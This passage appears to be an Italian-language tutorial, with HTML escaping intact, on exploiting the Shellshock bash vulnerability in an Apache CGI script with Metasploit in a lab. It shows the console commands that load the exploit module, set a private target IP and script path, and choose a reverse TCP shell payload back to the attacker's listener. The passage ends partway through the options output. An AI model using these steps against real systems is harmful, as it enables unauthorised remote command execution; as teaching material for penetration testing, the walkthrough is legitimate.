%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

       &lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; metasploit v6.3.21-dev                          &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+ -- --&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2329&lt;/span&gt; exploits - &lt;span style=&#34;color:#ae81ff&#34;&gt;1223&lt;/span&gt; auxiliary - &lt;span style=&#34;color:#ae81ff&#34;&gt;413&lt;/span&gt; post       &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+ -- --&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1385&lt;/span&gt; payloads - &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; encoders - &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; nops           &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+ -- --&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; evasion                                       &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

Metasploit tip: You can upgrade a shell to a Meterpreter 
session on many platforms using sessions -u 
&amp;lt;session_id&amp;gt;
Metasploit Documentation: https://docs.metasploit.com/

msf6 &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Possiamo facilmente cercare exploit utilizzando il comando di &lt;strong&gt;search&lt;/strong&gt;. Digitiamo &lt;strong&gt;search shellshock&lt;/strong&gt;, individuiamo il modulo &lt;strong&gt;apache_mod_cgi_bash_env_exec&lt;/strong&gt; e copiamo il percorso:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 &amp;gt; search shellshock

Matching Modules
&lt;span style=&#34;color:#f92672&#34;&gt;================&lt;/span&gt;

   &lt;span style=&#34;color:#75715e&#34;&gt;#   Name                                               Disclosure Date  Rank       Check  Description&lt;/span&gt;
   -   ----                                               ---------------  ----       -----  -----------
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Scanner
   &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Shellshock&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution

Interact with a module by name or index. For example info 11, use &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; or use exploit/multi/misc/xdh_x_exec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Carichiamo questo exploit digitando &lt;strong&gt;use&lt;/strong&gt; seguito dalla posizione che abbiamo precedentemente copiato. Ora dovrebbe esserci un prompt più lungo che indica il modulo attualmente caricato:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 &amp;gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Digitiamo &lt;strong&gt;options&lt;/strong&gt; per vedere le varie impostazioni per questo modulo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; options 

Module options &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;exploit/multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Accepted: CVE-2014-6271, CVE-2014-6278&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;,type:host:port&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   RHOSTS                           yes       The target host&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPATH           /bin             yes       Target PATH &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; binaries used by the CmdStager
   RPORT           &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;               yes       The target port &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;TCP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   SSL             false            no        Negotiate SSL/TLS &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; outgoing connections
   SSLCert                          no        Path to a custom SSL certificate &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is randomly generated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;                yes       HTTP read response timeout &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;seconds&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   URIPATH                          no        The URI to use &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this exploit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is random&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   VHOST                            no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;             yes       The local port to listen on.

Payload options &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;linux/x86/meterpreter/reverse_tcp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.176    yes       The listen address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   LPORT  &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   Linux x86

View the full module info with the info, or info -d command.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Possiamo lasciare la maggior parte delle impostazioni predefinite, ma dovremo impostare l&amp;rsquo;host remoto sull&amp;rsquo;indirizzo IP della destinazione e l&amp;rsquo;URI di destinazione sul file che abbiamo inserito nella directory /cgi-bin, in questo modo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set RHOSTS 192.168.1.245
RHOSTS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; 192.168.1.245
msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set TARGETURI /cgi-bin/hello.sh
TARGETURI &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; /cgi-bin/hello.sh
msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Successivamente, dobbiamo scegliere un payload. Digitiamo &lt;strong&gt;show payloads&lt;/strong&gt; per visualizzare i diversi payload e le informazioni relative a ciascuno di essi:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; show payloads

Compatible Payloads
&lt;span style=&#34;color:#f92672&#34;&gt;===================&lt;/span&gt;

   &lt;span style=&#34;color:#75715e&#34;&gt;#   Name                                              Disclosure Date  Rank    Check  Description&lt;/span&gt;
   -   ----                                              ---------------  ----    -----  -----------
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   payload/generic/custom                                             normal  No     Custom Payload
   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
   &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;   payload/generic/shell_bind_aws_ssm                                 normal  No     Command Shell, Bind SSM &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;via AWS API&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;   payload/generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
   &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;   payload/generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
   &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;   payload/generic/ssh/interact                                       normal  No     Interact with Established SSH Connection
   &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;   payload/generic/tight_loop                                         normal  No     Generic x86 Tight Loop
   &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;   payload/linux/x86/chmod                                            normal  No     Linux Chmod
   &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;   payload/linux/x86/exec                                             normal  No     Linux Execute Command
   &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;   payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;IPv6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
   &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
   &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;  payload/linux/x86/read_file                                        normal  No     Linux Read File
   &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;  payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;  payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;  payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;  payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;  payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;IPv6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
   &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;IPv6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;  payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;IPv6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Una reverse TCP shell sarà sufficiente, quindi digitiamo &lt;strong&gt;set payload linux/x86/shell/reverse_tcp&lt;/strong&gt; per abilitarla:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set payload linux/x86/shell/reverse_tcp
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; linux/x86/shell/reverse_tcp
msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Digitiamo di nuovo &lt;strong&gt;options&lt;/strong&gt; e possiamo vedere le impostazioni correnti per questo modulo, incluse le informazioni sul payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; options 

Module options &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;exploit/multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:

   Name            Current Setting    Required  Description
   ----            ---------------    --------  -----------
   CMD_MAX_LENGTH  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;               yes       CMD max line length
   CVE             CVE-2014-6271      yes       CVE to check/exploit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Accepted: CVE-2014-6271, CVE-2014-6278&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   HEADER          User-Agent         yes       HTTP header to use
   METHOD          GET                yes       HTTP method to use
   Proxies                            no        A proxy chain of format type:host:port&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;,type:host:port&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   RHOSTS          192.168.1.245      yes       The target host&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPATH           /bin               yes       Target PATH &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; binaries used by the CmdStager
   RPORT           &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;                 yes       The target port &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;TCP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   SSL             false              no        Negotiate SSL/TLS &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; outgoing connections
   SSLCert                            no        Path to a custom SSL certificate &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is randomly generated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   TARGETURI       /cgi-bin/hello.sh  yes       Path to CGI script
   TIMEOUT         &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;                  yes       HTTP read response timeout &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;seconds&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   URIPATH                            no        The URI to use &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this exploit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is random&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   VHOST                              no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;             yes       The local port to listen on.

Payload options &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;linux/x86/shell/reverse_tcp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
